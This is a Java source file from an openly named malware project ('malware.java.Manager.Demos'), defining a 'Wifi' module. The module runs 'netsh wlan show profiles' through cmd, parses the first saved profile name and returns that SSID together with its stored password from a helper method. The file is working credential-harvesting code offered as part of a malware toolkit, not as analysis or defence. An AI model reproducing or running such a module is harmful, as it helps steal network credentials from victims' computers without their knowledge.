/*
* all credits due to my boy walpere <33
* */

package malware.java.Manager.Demos;

import malware.java.Manager.Demo;
import malware.java.Utils.FormatUtils;

import java.io.IOException;
import java.util.Scanner;

public class Wifi extends Demo {
    public Wifi() {
        super("Wifi", "Returns wifi name and password");
    }

    @Override
    public String demo() {

        String command = "cmd /c call netsh.exe wlan show profiles";

        Process child;

        try {
            child = Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        Scanner sc = new Scanner(child.getInputStream());
        while (sc.hasNextLine()) {
            String s = sc.nextLine();
            if (s.contains("All User Profile")) {
                String[] split = s.split("\\s+");
                StringBuilder m = new StringBuilder();
                for (int i = 5; i < split.length; i++) {
                    if (i == split.length - 1) {
                        m.append(split[i]);
                    } else {
                        m.append(split[i]).append(" ");
                    }
                }

                return "SSID: " + m + " Password: " + utils.wifiPassword(m.toString());
            }
        }
        sc.close();
        return FormatUtils.INSTANCE.red + "Failure";
    }

}
